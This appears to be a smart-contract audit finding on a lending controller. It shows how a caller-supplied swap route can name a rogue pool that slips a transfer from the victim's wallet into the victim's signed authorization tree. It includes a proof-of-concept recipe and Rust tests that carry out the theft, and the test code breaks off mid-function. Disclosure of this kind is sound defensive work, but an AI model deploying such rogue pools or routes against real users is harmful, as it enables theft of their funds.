### Title
Malicious swap route executes attacker-controlled pool code under the caller's authorization - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Controller strategy entrypoints accept opaque swap-route bytes and forward them to the configured router without restricting the pool contracts encoded in that route. A malicious pool invoked during the route can add an unrelated `token.transfer(caller, attacker, amount)` beneath the caller's signed authorization tree while still returning a valid swap output, resulting in theft of wallet tokens when the victim signs the simulated authorization tree.

### Finding Description
`swap_collateral`, `swap_debt`, `multiply`, and `repay_debt_with_collateral` expose caller-controlled `swap: Bytes` arguments. [1](#0-0)  `StrategySwap` is only opaque `Bytes` from the controller's perspective. [2](#0-1)  After authenticating the account owner or delegate, `swap_collateral` forwards those bytes into `withdraw_and_swap_from_supply` and ultimately `swap_tokens`. [3](#0-2) 

`swap_tokens` narrowly authorizes the controller's exact input-token transfer to the router, but it does not inspect or restrict the route-selected venue contracts invoked below that call. [4](#0-3)  The router builds hop addresses directly from the route registry and invokes the selected pool contract. [5](#0-4)  For example, the Soroswap adapter calls payload-selected `get_reserves` and `swap` functions. [6](#0-5) 

The repository's adversarial test demonstrates the resulting authorization behavior: a route-selected contract can call `token.transfer` from the victim to an attacker, simulation records that call as a child of the victim's `swap_collateral` authorization, and enforcement succeeds if the victim signs that poisoned tree. [7](#0-6)  The same test confirms that an honest authorization tree rejects the theft, but that the poisoned signed tree permits it and moves the victim's entire unrelated wallet balance. [8](#0-7) 

### Impact Explanation
A malicious route provider can steal arbitrary tokens held by a strategy caller, including assets unrelated to the lending operation. The malicious venue can still produce the expected positive output, so the controller's measured-output and final-risk checks pass while the unrelated wallet transfer executes under the caller's signature. This is theft of user funds beyond the declared strategy input.

### Likelihood Explanation
The attack requires a victim to execute a strategy using attacker-supplied route bytes and to sign the authorization tree containing the malicious transfer. This is feasible through a malicious or compromised route/quote source or frontend. The attacker only needs to deploy an ABI-compatible venue contract and encode it in the route; no privileged protocol role is required. The dedicated test shows both the simulation path and the successful signed poisoned-tree execution. [9](#0-8) 

### Recommendation
Restrict swap routes to a governance-approved set of venue contracts before execution. The allowlist must cover every route-selected pool/venue address, not merely token addresses. As defense in depth, clients should decode routes and reject any simulated authorization tree containing children unrelated to the expected controller token flows, but client-side checks do not replace contract-level venue admission control.

### Proof of Concept
1. Deploy `RoguePool` implementing the selected venue ABI. In `swap`, call `token::Client::transfer(victim, attacker, victim_balance)` for an arbitrary token held by the victim, then transfer sufficient `token_out` to the router.
2. Encode a route whose `assets` registry contains `token_in`, `token_out`, and `RoguePool`, and whose instruction selects that pool.
3. Cause the victim to call `swap_collateral(victim, account_id, current, amount, new, route)`.
4. Simulate the transaction. The unauthorized-looking wallet transfer appears as a nested invocation beneath the victim's `swap_collateral` authorization.
5. If the victim signs the simulated tree, the rogue transfer executes, while the malicious pool supplies enough output for `verify_router_output` and the account risk checks to succeed.

This behavior is concretely exercised by `rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: recording mode places the rogue wallet transfer under the caller's authorization root, and enforcing mode succeeds only when that malicious transfer is signed. [10](#0-9)

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
